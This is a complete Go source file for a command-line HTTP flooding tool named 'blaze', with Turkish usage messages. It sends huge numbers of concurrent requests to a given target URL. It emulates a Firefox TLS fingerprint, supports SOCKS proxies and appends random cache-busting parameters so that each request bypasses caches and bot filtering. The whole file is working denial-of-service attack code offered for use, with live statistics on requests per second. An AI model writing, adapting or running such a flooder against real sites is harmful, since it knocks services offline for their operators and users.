package main

import (
	"context"
	"fmt"
	"math/rand"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
)

func main() {
	if len(os.Args) < 4 {
		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy]")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET socks5://127.0.0.1:1080")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	durSec := mustInt(os.Args[2], "sure")
	threads := mustInt(os.Args[3], "thread")

	streams := 32
	if len(os.Args) >= 5 {
		streams = mustInt(os.Args[4], "stream")
	}

	method := "GET"
	if len(os.Args) >= 6 {
		method = strings.ToUpper(os.Args[5])
	}

	proxyURL := ""
	if len(os.Args) >= 7 {
		proxyURL = os.Args[6]
	}

	run(targetURL, durSec, threads, streams, method, proxyURL)
}

func run(targetURL string, durSec, threads, streams int, method, proxyURL string) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	totalConcurrent := threads * streams

	idlePerHost := totalConcurrent
	if idlePerHost < 256 {
		idlePerHost = 256
	}
	totalIdle := totalConcurrent * 2
	if totalIdle < 512 {
		totalIdle = 512
	}

	opts := []gofire.Option{
		gofire.WithTimeout(10 * time.Second),
		gofire.WithTLSHandshakeTimeout(8 * time.Second),
		gofire.WithDialTimeout(8 * time.Second),
		gofire.WithMaxIdleConnsPerHost(idlePerHost),
		gofire.WithMaxIdleConns(totalIdle),
		gofire.WithMaxConnsPerHost(0),
		gofire.WithDNSCacheTTL(30 * time.Minute),
		gofire.WithIdleConnTimeout(120 * time.Second),
		gofire.WithDisableRedirects(),
		gofire.WithWriteBufferSize(128 * 1024),
		gofire.WithReadBufferSize(128 * 1024),
	}

	if proxyURL != "" {
		opts = append(opts, gofire.WithProxy(proxyURL))
	}

	client, err := gofire.Emulate(gofire.Firefox148, opts...)
	if err != nil {
		fmt.Fprintf(os.Stderr, "hata: client olusturulamadi: %v\n", err)
		os.Exit(1)
	}
	defer client.Close()

	fmt.Printf("hedef:     %s\n", targetURL)
	fmt.Printf("sure:      %ds\n", durSec)
	fmt.Printf("thread:    %d\n", threads)
	fmt.Printf("stream:    %d (per thread)\n", streams)
	fmt.Printf("eszamanli: %d\n", totalConcurrent)
	fmt.Printf("method:    %s\n", method)
	if proxyURL != "" {
		fmt.Printf("proxy:     %s\n", proxyURL)
	}

	// Pre-warm
	fmt.Print("baglanti isitiliyor...")
	warmCtx, warmCancel := context.WithTimeout(context.Background(), 10*time.Second)
	warmCount := threads
	if warmCount > 64 {
		warmCount = 64
	}
	_ = client.PreConnect(warmCtx, targetURL, warmCount)
	warmCancel()
	fmt.Printf(" %d baglanti hazir\n", client.ActiveConnections())

	// Context
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durSec)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		fmt.Println("\ndurduruluyor...")
		cancel()
	}()

	var (
		totalSent    atomic.Int64
		totalSuccess atomic.Int64
		totalFailed  atomic.Int64
		statusCodes  sync.Map
	)

	startTime := time.Now()
	fmt.Printf("basliyor... %d eszamanli istek\n\n", totalConcurrent)

	// Worker goroutines - thread x stream model (HTTP/2 multiplexing)
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			sem := make(chan struct{}, streams)
			var innerWg sync.WaitGroup

			for {
				select {
				case <-ctx.Done():
					innerWg.Wait()
					return
				default:
				}

				select {
				case sem <- struct{}{}:
				case <-ctx.Done():
					innerWg.Wait()
					return
				}

				reqURL := cacheBust(targetURL)
				totalSent.Add(1)

				innerWg.Add(1)
				go func(u string) {
					defer func() {
						<-sem
						innerWg.Done()
					}()

					resp, err := client.DoWithContext(ctx, method, u, nil, nil)
					if err != nil {
						totalFailed.Add(1)
						return
					}

					totalSuccess.Add(1)
					sc := resp.StatusCode()
					val, _ := statusCodes.LoadOrStore(sc, &atomic.Int64{})
					val.(*atomic.Int64).Add(1)
					resp.Close()
				}(reqURL)
			}
		}()
	}

	// Stats printer
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		var lastSent int64
		var peakRPS int64

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				sent := totalSent.Load()
				ok := totalSuccess.Load()
				fail := totalFailed.Load()
				elapsed := time.Since(startTime).Seconds()

				rps := sent - lastSent
				lastSent = sent
				if rps > peakRPS {
					peakRPS = rps
				}

				avgRPS := int64(0)
				if elapsed > 0 {
					avgRPS = int64(float64(sent) / elapsed)
				}

				fmt.Printf("\rsent:%d ok:%d fail:%d rps:%d avg:%d peak:%d %.0fs/%ds   ",
					sent, ok, fail, rps, avgRPS, peakRPS, elapsed, int(elapsed)+1)
			}
		}
	}()

	wg.Wait()

	// Final
	totalDuration := time.Since(startTime)
	sent := totalSent.Load()
	ok := totalSuccess.Load()
	fail := totalFailed.Load()

	avgRPS := float64(0)
	if totalDuration.Seconds() > 0 {
		avgRPS = float64(sent) / totalDuration.Seconds()
	}
	successRate := float64(0)
	if sent > 0 {
		successRate = float64(ok) / float64(sent) * 100
	}

	fmt.Printf("\n\n--- sonuclar ---\n")
	fmt.Printf("gonderilen: %d\n", sent)
	fmt.Printf("basarili:   %d (%%%.1f)\n", ok, successRate)
	fmt.Printf("basarisiz:  %d\n", fail)
	fmt.Printf("sure:       %v\n", totalDuration.Round(time.Millisecond))
	fmt.Printf("ort. rps:   %.0f req/s\n", avgRPS)
	fmt.Printf("baglanti:   %d\n", client.ActiveConnections())

	statusCodes.Range(func(key, value interface{}) bool {
		fmt.Printf("  %d: %d\n", key.(int), value.(*atomic.Int64).Load())
		return true
	})
	fmt.Println()
}

var bustParams = []string{"_", "cb", "nc", "t", "v", "r", "ts", "z"}

func cacheBust(base string) string {
	sep := "?"
	if strings.Contains(base, "?") {
		sep = "&"
	}
	return base + sep + bustParams[rand.Intn(len(bustParams))] + "=" + randStr(8)
}

const chars = "abcdefghijklmnopqrstuvwxyz0123456789"

func randStr(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func mustInt(s, name string) int {
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "hata: gecersiz %s: %s\n", name, s)
		os.Exit(1)
	}
	return v
}
